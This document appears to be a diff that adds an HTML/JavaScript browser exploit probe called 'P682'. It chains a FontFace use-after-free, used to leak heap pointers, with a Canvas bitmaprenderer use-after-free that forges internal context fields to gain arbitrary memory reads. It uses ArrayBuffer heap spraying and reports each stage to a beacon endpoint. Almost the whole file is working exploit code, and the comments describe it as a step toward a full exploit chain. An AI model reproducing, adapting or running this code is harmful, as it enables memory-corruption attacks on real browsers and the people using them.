@@ -1,0 +1,345 @@
+<!--
+  P682v2: FontFace heap pointer disclosure + Canvas UAF arbitrary read
+
+  Two-stage probe:
+  Phase A: FontFace CSSFontFace reclaim — engine writes heap pointers at
+           +0x58 and +0x68 into a 192-byte ArrayBuffer we control.
+           After reading, template ALL 192B buffers with engine's own
+           pointers (p564 survival trick) to prevent crash.
+  Phase B: Canvas BMR UAF — free a Canvas2D, reclaim with AB(768), forge
+           m_stateStack to point at the leaked heap address.
+           Read lineWidth/miterLimit/globalAlpha/shadowBlur through the
+           stale wrapper → reads from leaked heap location.
+
+  Result: if Phase B reads non-default values, we have arbitrary read at
+  known heap addresses — the missing primitive for the full exploit chain.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P682</title></head>
+<body><pre id="out">P682 — FontFace + Canvas UAF arbitrary read</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+
+var _imgs=[];for(var i=0;i<300;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%300];
+  img.src='/beacon.php?tag=P682-'+encodeURIComponent(tag)+'&data='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2hex(v){
+  _f64[0]=v;
+  return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);
+}
+
+/* ====================================================================
+   PHASE A: FontFace CSSFontFace reclaim — leak heap pointers
+   ==================================================================== */
+
+var leakedHi=0, leakedLo=0, leakedHi2=0, leakedLo2=0;
+var fontfaceHit=false;
+
+function runFontFaceLeak(){
+  say('Phase A: FontFace heap pointer leak...');
+  bk('A0','start');
+
+  var styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__ffAlive = [A];
+
+  var firedHere = false;
+  var SIZES = [64, 96, 128, 160, 192, 224, 256, 320, 384, 512, 768, 1024, 2048];
+  var K = 8;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      styleEl.remove();
+      styleEl.textContent = '';
+      styleEl = null;
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      window.__ffMap = [];
+      for (var si=0; si<SIZES.length; si++){
+        var size = SIZES[si];
+        for (var k=0; k<K; k++){
+          var ab = new ArrayBuffer(size);
+          window.__ffMap.push({ size:size, view:new Uint8Array(ab), ab:ab });
+        }
+      }
+      try { document.fonts.check('1em s0'); } catch(e){}
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  bk('A1','load-called');
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function(){ bk('A2-OK','resolved'); },
+    function(){ bk('A2-ERR','rejected'); }
+  );
+
+  setTimeout(function(){ scanFF(80); }, 80);
+  setTimeout(function(){ scanFF(200); }, 200);
+  setTimeout(function(){ scanFF(400); }, 400);
+  setTimeout(runCanvasUAF, 500);
+}
+
+function scanFF(ms){
+  if (fontfaceHit) return;
+  var m = window.__ffMap;
+  if (!m || !m.length) return;
+
+  for (var i=0; i<m.length; i++){
+    if (m[i].size !== 192) continue;
+    var v = m[i].view, nz=0;
+    for (var j=0; j<v.length; j++) if (v[j]!==0) nz++;
+    if (nz >= 3){
+      var dv = new DataView(m[i].ab);
+      leakedLo = dv.getUint32(0x58, true);
+      leakedHi = dv.getUint32(0x5C, true);
+      leakedLo2 = dv.getUint32(0x68, true);
+      leakedHi2 = dv.getUint32(0x6C, true);
+
+      var a1 = '0x'+('00000000'+leakedHi.toString(16)).slice(-8)+('00000000'+leakedLo.toString(16)).slice(-8);
+      var a2 = '0x'+('00000000'+leakedHi2.toString(16)).slice(-8)+('00000000'+leakedLo2.toString(16)).slice(-8);
+
+      fontfaceHit = (leakedHi !== 0 || leakedLo !== 0);
+
+      var raw='';for(var j=0;j<Math.min(v.length,96);j++) raw+=('0'+v[j].toString(16)).slice(-2);
+      bk('A3-HIT','ms='+ms+'|buf='+i+'|nz='+nz+'|p58='+a1+'|p68='+a2);
+      bk('A3-RAW',raw);
+      say('FontFace HIT @'+ms+'ms: +0x58='+a1+' +0x68='+a2);
+
+      /* CRITICAL: template ALL 192-byte buffers with the engine's own
+         pointers so the stale CSSFontFace continuation doesn't crash.
+         This is the p564 survival trick. */
+      var p58bytes = new Uint8Array(8);
+      var p68bytes = new Uint8Array(8);
+      var tmpDv = new DataView(p58bytes.buffer);
+      tmpDv.setUint32(0, leakedLo, true);
+      tmpDv.setUint32(4, leakedHi, true);
+      var tmpDv2 = new DataView(p68bytes.buffer);
+      tmpDv2.setUint32(0, leakedLo2, true);
+      tmpDv2.setUint32(4, leakedHi2, true);
+
+      for (var k=0; k<m.length; k++){
+        if (m[k].size !== 192) continue;
+        var bv = m[k].view;
+        bv[0] = 1; bv[1]=0; bv[2]=0; bv[3]=0; bv[4]=0; bv[5]=0; bv[6]=0; bv[7]=0;
+        bv.set(p58bytes, 0x58);
+        bv.set(p68bytes, 0x68);
+      }
+      bk('A3-TEMPLATE','templated-all-192B-bufs');
+
+      return;
+    }
+  }
+  bk('A3-CLEAN','ms='+ms);
+}
+
+/* ====================================================================
+   PHASE B: Canvas UAF with AB(768) reclaim — arbitrary read
+   ==================================================================== */
+
+function runCanvasUAF(){
+  var tHi, tLo;
+  if (fontfaceHit){
+    tHi = leakedHi;
+    tLo = leakedLo;
+    var addr = '0x'+('00000000'+tHi.toString(16)).slice(-8)+('00000000'+tLo.toString(16)).slice(-8);
+    bk('B0','fontface-addr='+addr);
+    say('Phase B: Canvas UAF targeting '+addr);
+  } else {
+    bk('B0','no-fontface|skipping-arbread');
+    say('Phase B: no FontFace hit — cannot do arbitrary read');
+    bk('DONE','fontface-failed');
+    say('P682 done (FontFace failed).');
+    return;
+  }
+
+  /* -- BMR TRIGGER (v573 pattern) -- */
+  var innerCtx = null;
+  var getterRan = false;
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function(){
+    getterRan = true;
+    innerCtx = canvas.getContext('2d');
+    innerCtx.lineWidth = 1.0;
+    return true;
+  }});
+
+  canvas.getContext('bitmaprenderer', uafOpts);
+  bk('B1-UAF','getter='+getterRan+',ctx='+(innerCtx?'OK':'NULL'));
+
+  if (!innerCtx){
+    bk('B1-FAIL','no-ctx');
+    say('Canvas UAF failed — no context');
+    return;
+  }
+
+  /* -- FLUSH DEALLOC LOG -- */
+  for (var f=0; f<600; f++) new ArrayBuffer(16);
+  bk('B2-FLUSH','600-done');
+
+  /* -- AB(768) SPRAY -- */
+  var SPRAY_N = 200;
+  var abs = [];
+  var dvs = [];
+  for (var s=0; s<SPRAY_N; s++){
+    var ab = new ArrayBuffer(768);
+    abs.push(ab);
+    dvs.push(new DataView(ab));
+  }
+  bk('B3-SPRAY','n='+SPRAY_N);
+
+  /* -- FORGE m_stateStack IN ALL ABs --
+     m_stateStack is a Vector<State> at context+112:
+       +112: m_buffer (8 bytes, pointer to State array)
+       +120: m_capacity (4 bytes)
+       +124: m_size (4 bytes)
+
+     We set m_buffer = leaked_address directly.
+     lineWidth reads from m_buffer[0] + lineWidth_offset_in_State.
+     We don't know the exact offset, but any non-default read proves
+     the arbitrary read works.
+
+     Also set +32 (m_canvas) to leaked address — a readable heap address
+     should survive a shallow GC trace long enough for us to null innerCtx.
+  */
+  for (var w=0; w<dvs.length; w++){
+    var dv = dvs[w];
+    dv.setUint32(32, tLo, true);
+    dv.setUint32(36, tHi, true);
+    dv.setUint32(112, tLo, true);
+    dv.setUint32(116, tHi, true);
+    dv.setUint32(120, 1, true);
+    dv.setUint32(124, 1, true);
+  }
+
+  bk('B4-FORGE','done|tgt=0x'+('00000000'+tHi.toString(16)).slice(-8)+('00000000'+tLo.toString(16)).slice(-8));
+
+  /* -- CRITICAL READS (may SIGSEGV if target unmapped) -- */
+  var lwR, mlR, gaR, sbR, txR;
+  var readErr = '';
+  try { lwR = innerCtx.lineWidth; } catch(e){ readErr += 'lw:'+e.message+' '; }
+  try { mlR = innerCtx.miterLimit; } catch(e){ readErr += 'ml:'+e.message+' '; }
+  try { gaR = innerCtx.globalAlpha; } catch(e){ readErr += 'ga:'+e.message+' '; }
+  try { sbR = innerCtx.shadowBlur; } catch(e){ readErr += 'sb:'+e.message+' '; }
+  try {
+    var t = innerCtx.getTransform();
+    txR = {a:t.a, b:t.b, c:t.c, d:t.d, e:t.e, f:t.f};
+  } catch(e){ readErr += 'tx:'+e.message+' '; }
+
+  /* -- IMMEDIATELY SAFE: null wrapper + clear forged data -- */
+  innerCtx = null;
+  canvas = null;
+  for (var c=0; c<dvs.length; c++){
+    dvs[c].setFloat64(32, 0, true);
+    dvs[c].setFloat64(112, 0, true);
+    dvs[c].setUint32(120, 0, true);
+    dvs[c].setUint32(124, 0, true);
+  }
+
+  /* -- BEACON ALL RESULTS -- */
+  if (readErr) bk('B5-ERR', readErr);
+
+  if (lwR !== undefined){
+    bk('B6-LW','val='+lwR+'|hex='+f2hex(lwR)+'|def='+(lwR===1.0));
+    say('lineWidth='+lwR+' ('+f2hex(lwR)+')');
+  }
+  if (mlR !== undefined){
+    bk('B6-ML','val='+mlR+'|hex='+f2hex(mlR)+'|def='+(mlR===10.0));
+    say('miterLimit='+mlR+' ('+f2hex(mlR)+')');
+  }
+  if (gaR !== undefined){
+    bk('B6-GA','val='+gaR+'|hex='+f2hex(gaR)+'|def='+(gaR===1.0));
+    say('globalAlpha='+gaR+' ('+f2hex(gaR)+')');
+  }
+  if (sbR !== undefined){
+    bk('B6-SB','val='+sbR+'|hex='+f2hex(sbR)+'|def='+(sbR===0.0));
+    say('shadowBlur='+sbR+' ('+f2hex(sbR)+')');
+  }
+  if (txR){
+    bk('B6-TX','a='+txR.a+'|b='+txR.b+'|c='+txR.c+'|d='+txR.d+'|e='+txR.e+'|f='+txR.f);
+    bk('B6-TX-HEX','a='+f2hex(txR.a)+'|b='+f2hex(txR.b)+'|c='+f2hex(txR.c)+'|d='+f2hex(txR.d)+'|e='+f2hex(txR.e)+'|f='+f2hex(txR.f));
+    say('transform: a='+txR.a+' b='+txR.b+' c='+txR.c+' d='+txR.d+' e='+txR.e+' f='+txR.f);
+  }
+
+  var lwDef = (lwR === 1.0);
+  var mlDef = (mlR === 10.0);
+  var gaDef = (gaR === 1.0);
+  var sbDef = (sbR === 0.0);
+  var txDef = txR && (txR.a===1 && txR.b===0 && txR.c===0 && txR.d===1 && txR.e===0 && txR.f===0);
+
+  if (!lwDef || !mlDef || !gaDef || !sbDef || !txDef){
+    bk('B7-ARBREAD','CONFIRMED|lw='+(lwDef?'d':'H')+'|ml='+(mlDef?'d':'H')+'|ga='+(gaDef?'d':'H')+'|sb='+(sbDef?'d':'H')+'|tx='+(txDef?'d':'H'));
+    say('*** ARBITRARY READ CONFIRMED ***');
+  } else {
+    bk('B7-DEFAULTS','all-default|reclaim-miss-or-zeroed');
+    say('All defaults — AB may not have reclaimed the freed context');
+
+    /* -- PHASE C: retry with SAME-TYPE reclaim to confirm UAF still works -- */
+    bk('C0','same-type-fallback');
+    say('Phase C: same-type reclaim check...');
+
+    var innerCtx2 = null;
+    var canvas2 = document.createElement('canvas');
+    canvas2.width = 1; canvas2.height = 1;
+    var opts2 = {};
+    Object.defineProperty(opts2, 'alpha', {get: function(){
+      innerCtx2 = canvas2.getContext('2d');
+      innerCtx2.lineWidth = 1.0;
+      return true;
+    }});
+    canvas2.getContext('bitmaprenderer', opts2);
+
+    if (innerCtx2){
+      var sprayCtxs = [];
+      for (var i=0; i<300; i++){
+        var sc = document.createElement('canvas');
+        sc.width=1; sc.height=1;
+        var sx = sc.getContext('2d');
+        if (sx){ sx.lineWidth = 7777.77; sprayCtxs.push(sx); }
+      }
+      var lw2;
+      try { lw2 = innerCtx2.lineWidth; } catch(e){ lw2 = 'ERR'; }
+      bk('C1','same-type-lw='+lw2+'|hit='+(lw2===7777.77));
+      say('Same-type check: lineWidth='+lw2+' (expect 7777.77 if reclaim works)');
+    }
+  }
+
+  bk('DONE','complete');
+  say('P682 complete.');
+}
+
+/* ====================================================================
+   START
+   ==================================================================== */
+bk('BOOT','p682-fontface-canvas-combined');
+say('Starting P682...');
+
+var reloadToken='';
+function checkReload(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?t='+Date.now(),true);x.timeout=3000;
+  x.onload=function(){var tok=x.responseText.trim();if(tok&&reloadToken&&tok!==reloadToken){setTimeout(function(){location.reload(true)},1000);return;}reloadToken=tok;};x.send();}catch(e){}
+}
+setInterval(checkReload,5000);
+
+runFontFaceLeak();
+</script>
+</body></html>
